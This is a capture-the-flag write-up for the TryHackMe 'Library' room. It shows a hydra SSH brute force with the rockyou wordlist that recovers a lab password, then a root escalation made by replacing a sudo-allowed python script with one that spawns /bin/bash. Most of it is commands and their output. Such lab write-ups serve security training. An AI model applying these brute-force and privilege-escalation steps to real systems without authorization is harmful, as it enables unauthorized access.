# Library Tryhackme Writeup

1. In http robots.txt gives hint rockyou and website shows posted by **meliodas**. Run ssh brute froce hydra accordingly to this.
2. Hydra finished got ssh passwd meliodas:iloveyou1
3. Privesc in home dir bak.py python script own by root. root can run this file. Not writeable by other user but we can delete it.
4. Delete the bak.py and create new one as same name bak.py

```bash
┌──(arundhanush㉿kali)-[~/CTF/THM/library]
└─$ hydra -l meliodas -P /usr/share/wordlists/rockyou.txt 10.10.123.199 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-23 00:00:24
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.123.199:22/

[STATUS] 147.00 tries/min, 147 tries in 00:01h, 14344253 to do in 1626:20h, 16 active
[22][ssh] host: 10.10.123.199   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-23 00:02:19

``` 

```bash
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

Original bak.py

```py
meliodas@ubuntu:~$ cat bak.py 
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()

```

New bak.py

```bash
meliodas@ubuntu:~$ cat bak.py 
import os

os.system("/bin/bash")

```

```bash
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# whoami
root

```